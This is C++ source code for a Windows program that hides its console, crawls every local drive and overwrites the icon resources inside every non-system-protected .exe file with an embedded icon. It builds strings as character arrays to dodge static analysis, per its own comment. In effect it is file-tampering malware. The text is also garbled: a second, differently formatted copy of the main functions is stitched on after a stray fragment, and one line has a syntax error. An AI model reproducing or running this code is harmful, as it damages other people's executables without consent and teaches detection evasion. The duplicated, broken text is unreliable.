#include <Sfc.h>
#include <Windows.h>

#include <chrono>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <map>
#include <thread>
#include <vector>

#include "resource.h"

#pragma comment(lib, "sfc")

std::vector<std::wstring> GetDriveLetters() {
    wchar_t driveSlash[] = {':', '\\', 0};
    wchar_t diskLetter = 67;  // Start with 'C'
    std::vector<std::wstring> foundDrives;

    for (short i = 1; i != 25; i++) {
        std::wstring concatDrivePath;
        concatDrivePath += diskLetter;
        concatDrivePath += driveSlash;

        if (std::filesystem::exists(concatDrivePath)
        {
            UINT drivetype = ::GetDriveTypeW(concatDrivePath.c_str());

            if (drivetype != 5 && drivetype != 0) {
                foundDrives.push_back(concatDrivePath);
            }
        }
        
        diskLetter++;
    }
    return foundDrives;
}

std::map<LPCWSTR, WORD> resNames;

BOOL CALLBACK EnumIconLang(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    if (lpType == NULL && lpName == NULL) {
        return false;
    }

    resNames.emplace(lpName, wLanguage);

    return true;
}

BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    if (lpType == NULL && lpName == NULL) {
        return false;
    }

    ::EnumResourceLanguagesExW(hModule, lpType, lpName, EnumIconLang, lParam, 0, 0);

    return true;
}

void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize) {
    // Using a char array instead of string in an attempt to deter static analysis string identification.
    wchar_t exeExt[] = {'.', 'e', 'x', 'e', 0};

    for (auto itr_path : std::filesystem::recursive_directory_iterator(
             *pathStart, std::filesystem::directory_options::skip_permission_denied)) {
        // If current file is not .EXE, skip to next file.
        if (!(itr_path.path().extension() == exeExt)) {
            continue;
        }

        const std::wstring currentPath = itr_path.path().wstring();

        // Check if current file is a system protected file. If so, skip.
        if (::SfcIsFileProtected(NULL, currentPath.c_str())) {
            continue;
        }

        // Import EXE as a data image, no execution and locked memory until released.
        HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL,
                                            (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
        if (hmTheExe == NULL) {
            resNames.clear();
            continue;
        }

        if (!::EnumResourceNamesExW(hmTheExe, MAKEINTRESOURCEW(RT_ICON), EnumIconNames, NULL, 0, 0)) {
            switch (::GetLastError()) {
                case 1812:  // "The specified image file did not contain a resource section."
                case 1813:  // "The specified resource type cannot be found in the image file."
                {
                    // std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add\n";
                    if (!::FreeLibrary(hmTheExe)) {
                        resNames.clear();
                        continue;
                    }
                    HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
                    if (hUpdateResource == NULL) {
                        resNames.clear();
                        continue;
                    }
                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_GROUP_ICON), L"101", 1033, lpMDcanIcon,
                                           dwMDcanIconSize)) {
                        // std::wcout << ::GetLastError() << " Could not update group resource.\n";
                        resNames.clear();
                        continue;
                    }
                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), NULL, NULL, lpMDcanIcon,
                                           dwMDcanIconSize)) {
                        // std::wcout << ::GetLastError() << " Could not update icon resource.\n";
                        resNames.clear();
                        continue;
                    }
                    if (!::EndUpdateResourceW(hUpdateResource, false)) {
                        // std::wcout << ::GetLastError() << " Could not end update resource.\n";
                        resNames.clear();
                        continue;
                    }
                    resNames.clear();
                    break;
                }
                default:
                    break;
            }
            resNames.clear();
            continue;
        }

        if (!::FreeLibrary(hmTheExe)) {
            resNames.clear();
            continue;
        }

        HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
        if (hUpdateResource == NULL) {
            resNames.clear();
            continue;
        }

        std::map<LPCWSTR, WORD>::iterator itr;
        for (itr = resNames.begin(); itr != resNames.end(); itr++) {
            if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), itr->first, itr->second, lpMDcanIcon,
                                   dwMDcanIconSize)) {
                resNames.clear();
                continue;
            }
        }

        if (!::EndUpdateResourceW(hUpdateResource, false)) {
            resNames.clear();
            continue;
        }

        resNames.clear();
    }
}

// void ReplaceSysIcons()
//{
//    // Get paths to
//    // C:\Windows\SystemResources\imageres.dll.mun
//    // C:\Windows\SystemResources\shell32.dll.mun
//    // ...
//}

int main() {
    // Hide console from GUI.
    ::FreeConsole();

    HRSRC hresMDCanIcon = ::FindResourceExW(NULL, MAKEINTRESOURCE(RT_ICON), MAKEINTRESOURCE(1), 0);
    if (hresMDCanIcon == NULL) {
        return -1;
    }

    HGLOBAL hgMDcanIcon = ::LoadResource(NULL, hresMDCanIcon);
    if (hgMDcanIcon == NULL) {
        return -1;
    }

    LPVOID lpMDcanIcon = ::LockResource(hgMDcanIcon);
    if (lpMDcanIcon == NULL) {
        return -1;
    }

    DWORD dwMDcanIconSize = SizeofResource(NULL, hresMDCanIcon);
    if (dwMDcanIconSize == 0) {
        return -1;
    }

    std::vector<std::wstring> drives = GetDriveLetters();

    // TODO: Implement threading to work on multiple drives at once
    // and possibly start from top-bottom of drive data to meet in middle.
    for (auto& drive : drives) {
        std::filesystem::path drivepath = drive.c_str();
        ReplaceEXEIconResources(&drivepath, lpMDcanIcon, dwMDcanIconSize);
    }

    UnlockResource(lpMDcanIcon);
    ::FreeResource(hgMDcanIcon);
    std::wcout << std::endl;  // Empty OUT buffer to feel good.

    return 0;
}

	
    return true;
}

void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
{
	// Using a char array instead of string in an attempt to deter static analysis string identification.
    wchar_t exeExt[] = { '.','e','x','e',0 };
	
    for (auto itr_path : std::filesystem::recursive_directory_iterator(*pathStart, std::filesystem::directory_options::skip_permission_denied))
    {
		// If current file is not .EXE, skip to next file.
        if (!(itr_path.path().extension() == exeExt)) { continue; }
        
		const std::wstring currentPath = itr_path.path().wstring();
		
		// Check if current file is a system protected file. If so, skip.
		if (::SfcIsFileProtected(NULL, currentPath.c_str())) { continue; }
		
		// Import EXE as a data image, no execution and locked memory until released.
		HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL, (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
		if (hmTheExe == NULL)
		{
			resNames.clear();
			continue;
		}

		if (!::EnumResourceNamesExW(hmTheExe, MAKEINTRESOURCEW(RT_ICON), EnumIconNames, NULL, 0, 0))
		{
			switch (::GetLastError())
			{
				case 1812: // "The specified image file did not contain a resource section."
				case 1813: // "The specified resource type cannot be found in the image file."
				{
					//std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add\n";
					if (!::FreeLibrary(hmTheExe))
					{
						resNames.clear();
						continue;
					}
					HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
					if (hUpdateResource == NULL)
					{
						resNames.clear();
						continue;
					}
					if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_GROUP_ICON), L"101", 1033, lpMDcanIcon, dwMDcanIconSize))
					{
						//std::wcout << ::GetLastError() << " Could not update group resource.\n";
						resNames.clear();
						continue;
					}
					if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), NULL, NULL, lpMDcanIcon, dwMDcanIconSize))
					{
						//std::wcout << ::GetLastError() << " Could not update icon resource.\n";
						resNames.clear();
						continue;
					}
					if (!::EndUpdateResourceW(hUpdateResource, false))
					{
						//std::wcout << ::GetLastError() << " Could not end update resource.\n";
						resNames.clear();
						continue;
					}
					resNames.clear();
					break;
				}
				default:
					break;
			}
			resNames.clear();
			continue;
		}

		if (!::FreeLibrary(hmTheExe))
		{
			resNames.clear();
			continue;
		}

		HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
		if (hUpdateResource == NULL)
		{
			resNames.clear();
			continue;
		}

		std::map<LPCWSTR, WORD>::iterator itr;
		for (itr = resNames.begin(); itr != resNames.end(); itr++)
		{
			if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), itr->first, itr->second, lpMDcanIcon, dwMDcanIconSize))
			{
				resNames.clear();
				continue;
			}
		}

		if (!::EndUpdateResourceW(hUpdateResource, false))
		{
			resNames.clear();
			continue;
		}

		resNames.clear();
        
    }
}

//void ReplaceSysIcons()
//{
//    // Get paths to 
//    // C:\Windows\SystemResources\imageres.dll.mun
//    // C:\Windows\SystemResources\shell32.dll.mun
//    // ...
//}

int main()
{
	// Hide console from GUI.
    ::FreeConsole();

    HRSRC hresMDCanIcon = ::FindResourceExW(NULL, MAKEINTRESOURCE(RT_ICON), MAKEINTRESOURCE(1), 0);
    if (hresMDCanIcon == NULL)
    {
        return -1;
    }

    HGLOBAL hgMDcanIcon = ::LoadResource(NULL, hresMDCanIcon);
    if (hgMDcanIcon == NULL)
    {
        return -1;
    }

    LPVOID lpMDcanIcon = ::LockResource(hgMDcanIcon);
    if (lpMDcanIcon == NULL)
    {
        return -1;
    }

    DWORD dwMDcanIconSize = SizeofResource(NULL, hresMDCanIcon);
    if (dwMDcanIconSize == 0)
    {
        return -1;
    }
    
    std::vector<std::wstring> drives = GetDriveLetters();

	// TODO: Implement threading to work on multiple drives at once
	// and possibly start from top-bottom of drive data to meet in middle.
    for (auto &drive : drives)
    {
        std::filesystem::path drivepath = drive.c_str();
        ReplaceEXEIconResources(&drivepath, lpMDcanIcon, dwMDcanIconSize);
    }

    UnlockResource(lpMDcanIcon);
    ::FreeResource(hgMDcanIcon);
    std::wcout << std::endl; // Empty OUT buffer to feel good.

    return 0;
}
